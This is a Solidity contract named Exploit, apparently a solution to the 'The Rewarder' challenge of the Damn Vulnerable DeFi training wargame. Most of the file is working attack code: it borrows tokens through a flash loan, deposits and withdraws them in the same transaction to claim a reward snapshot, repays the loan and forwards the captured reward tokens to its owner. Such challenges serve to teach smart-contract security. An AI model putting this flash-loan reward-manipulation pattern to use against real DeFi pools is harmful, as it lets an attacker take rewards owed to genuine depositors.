//SPDX-License-Identifier MIT

pragma solidity ^0.8.0;

import "./DamnValuableToken.sol";
import "./RewardToken.sol";

interface ITheRewardPool {
    function deposit(uint256) external;

    function withdraw(uint256) external;

    function distributeRewards() external returns (uint256);

    function rewardToken() external returns (RewardToken);

    function liquidityToken() external returns (DamnValuableToken);
}

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

contract Exploit {
    ITheRewardPool public immutable theRewardPool;
    IFlashLoanerPool public immutable flashLoanerPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address public immutable owner;

    constructor(
        address _theRewardPool,
        address _flashLoanerPool,
        address _owner
    ) {
        theRewardPool = ITheRewardPool(_theRewardPool);
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        liquidityToken = theRewardPool.liquidityToken();
        rewardToken = theRewardPool.rewardToken();
        owner = _owner;
    }

    function getFlashLoan(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        //approve

        liquidityToken.approve(address(theRewardPool), amount);

        //deposit
        theRewardPool.deposit(amount);

        //withdraw
        theRewardPool.withdraw(amount);

        //return the loan back
        liquidityToken.transfer(address(flashLoanerPool), amount);

        //send the tokens back to owner
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    receive() external payable {}
}
